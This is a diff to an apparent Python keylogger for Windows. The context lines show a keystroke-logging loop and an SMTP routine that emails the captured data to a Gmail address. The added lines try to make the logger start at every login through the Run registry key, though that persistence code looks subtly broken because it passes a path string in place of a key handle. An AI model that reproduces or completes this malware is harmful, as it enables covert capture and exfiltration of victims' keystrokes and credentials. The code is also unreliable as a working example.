@@ -4,6 +4,13 @@ import win32con
 import time
 import pythoncom
 
+def install_self():
+    path = sys.executable
+    key = win32con.REG_SZ
+    key_path = "Software\Microsoft\Windows\CurrentVersion\Run"
+    value_name = "MyScript"
+    win32api.RegSetValueEx(win32con.HKEY_CURRENT_USER, key_path, 0, key, path)
+
 def key_logger():
     log = ""
     while True:
@@ -41,4 +48,5 @@ def send_email(data):
     mail_server.sendmail('wargraymon66@gmail.com', 'treyloggins18@gmail.com', message)
     mail_server.quit()
 
+install_self()
 key_logger()
